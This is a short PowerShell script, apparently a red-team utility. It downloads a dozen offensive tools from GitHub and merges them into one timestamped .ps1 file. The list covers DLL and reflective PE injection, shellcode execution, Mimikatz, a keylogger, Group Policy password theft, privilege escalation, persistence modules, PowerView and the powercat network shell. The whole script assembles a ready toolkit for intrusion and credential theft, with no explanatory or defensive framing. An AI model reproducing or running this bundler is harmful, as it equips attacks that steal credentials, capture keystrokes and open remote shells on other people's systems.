$currentDateTime = Get-Date -format yyyyMMdd_HHmm
Write-Output $currentDateTime
$outputFile = "combined_" + $currentDateTime + ".ps1"

$arrayURL=@("https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1",
"https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1",
"https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1",
"https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1",
"https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1",
"https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1",
"https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1",
"https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1",
"https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1",
"https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Persistence/Persistence.psm1",
"https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1",
"https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"
)

# Create a web client object
$webClient = New-Object System.Net.WebClient

foreach ($url in $arrayURL)
{
    try 
    {
        Add-Content -Path $outputFile -Value $webClient.DownloadString($url)
        "[*] Successful: $url"
    }
    catch [system.exception] 
    {
        "[!] Error: $url"
    }
}